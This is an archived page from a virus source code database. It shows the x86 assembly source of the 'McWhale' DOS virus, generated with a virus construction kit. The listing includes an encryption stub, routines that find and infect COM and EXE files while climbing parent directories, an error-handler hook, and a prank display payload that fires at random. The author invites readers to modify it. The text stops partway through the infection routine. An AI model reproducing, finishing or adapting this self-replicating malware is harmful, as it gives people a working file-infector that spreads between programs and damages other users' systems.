<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: mcwhale_asm</title>
<meta name="KEYWORDS" content="mcwhale.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for mcwhale.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; McWhale.asm : [McAfee' Whale] by [pAgE]
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg
;
; Here's another "lame dick" virus! I thought it was rather fitting!
; Many thanks to the fellows at Phalcon/Skism for this little tool.
; I am sure that Dark Angel and the bunch are not stopping here, but
; will come up with another innovation in Vx production...
;
; I have set this file to activate at a 40% chance on any day. Feel free
; to modify this program as you see fit or keep it as a novelty in its
; original form.


.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'MO'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
          mov  bx,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  si,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,04h              ; add word ptr cs:[si], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  si                       ; calculate new decryption location
          inc  si
          dec  bx                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],2 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h                      ;
         ;cmp  dh,4                     ; Check month
         ;jb   exit_virus               ;
         ;cmp  dl,15                    ; Check date
         ;jnz  exit_virus               ;

         ;mov  ah,2ch                   ; Get current time
         ;int  21h
          cmp  dl,40                    ; Check the percentage
          jbe  activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate        proc    far

start:
		jmp	loc_1
data_1		db	0
data_2		dw	0
		db	 62h, 79h
                db      ' ABRAXAS - '
copyright       db      '(c) 1992 Abraxas Warez.'
                db      '.....................................BEWARE!!!............'
                db      '....................'
data_5          db      'Anti-Virus.....Man.....John.....McAfee.....wrote'
                db      '.....the.....WHALE.....virus!!!'
                db      '..............................HONEST!!!....................................$'
loc_1:
		push	si
		push	di
		mov	si,80h
		cld				; Clear direction
		call	sub_1
		cmp	byte ptr [si],0Dh
		je	loc_4			; Jump if equal
		mov	cx,28h
		lea	di,data_5		; ('Attention: Please press ') Load ef
locloop_2:
		lodsb				; String [si] to al
		cmp	al,0Dh
		je	loc_3			; Jump if equal
		stosb				; Store al to es:[di]
		loop	locloop_2		; Loop if cx > 0
loc_3:
		inc	cx
		mov	al,2Eh			; '.'
		rep	stosb			; Rep when cx >0 Store al to es:[di]
loc_4:
		pop	di
		pop	si
		mov	ah,3
		mov	bh,0
		int	10h			; Video display   ah=functn 03h
						;  get cursor loc in dx, mode cx

                mov     data_2,cx
		mov	ah,1
		mov	cx,0F00h
		int	10h			; Video display   ah=functn 01h
						;  set cursor mode in cx
		mov	ah,2
		mov	dh,18h
		mov	dl,13h
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
loc_5:
		mov	data_1,0FFh
loc_6:
		add	data_1,1
		mov	bl,data_1
		mov	bh,0
		mov	cx,27h
		call	sub_2

locloop_7:
		mov	al,byte ptr copyright+20h[bx]	; ('.')
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		inc	bx
		call	sub_3
		mov	dl,0FFh
		mov	ah,6
		int	21h			; DOS Services  ah=function 06h
						;  special char i/o, dl=subfunc
		jnz	loc_10			; Jump if not zero
		loop	locloop_7		; Loop if cx > 0

		cmp	byte ptr copyright+20h[bx],24h	; ('.') '$'
		je	loc_5			; Jump if equal
		jmp	short loc_6

activate        endp

sub_1		proc	near
loc_8:
		inc	si
		cmp	byte ptr [si],20h	; ' '
		je	loc_8			; Jump if equal
                retn
sub_1		endp

sub_2		proc	near
                push    ax
                push    bx
                push    cx
                push    dx
                mov     dx,si
                mov     cx,di
                mov     al,4
                mov     ah,0ch
                int     10h
                mov     ah,2
                mov     dh,8h
                mov     dl,14h
                mov     cx,30
                int     10h                     ; Video display   ah=functn 02h
                mov     ah,10h
                mov     al,0
                mov     bl,4
                mov     bh,63
                int     10h
                pop     dx
                pop     cx
                pop     bx
                pop     ax

                retn
sub_2		endp

sub_3		proc	near
		push	cx
		mov	cx,258h
locloop_9:
		loop	locloop_9		; Loop if cx > 0
		pop	cx
		retn
sub_3		endp

loc_10:
		call	sub_2
		mov	cx,4Fh
locloop_11:
		mov	al,20h			; ' '
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		loop	locloop_11		; Loop if cx > 0

		mov	ah,1
		mov	cx,data_2
		int	10h			; Video display   ah=functn 01h
		int	20h			; DOS program terminate
          jmp  exit_virus

creator             db '[MPC]',0                ; BIG SIGN!!!
virusname           db "[McAfee' Whale]",0      ; That's it!!
author              db '[pAgE]',0               ; Nah! Not me!<g>

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+35] ; Get tail of filename
          cmp  ax,'DN'                  ; Ends in ND? (commaND)
          jz   find_next

          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
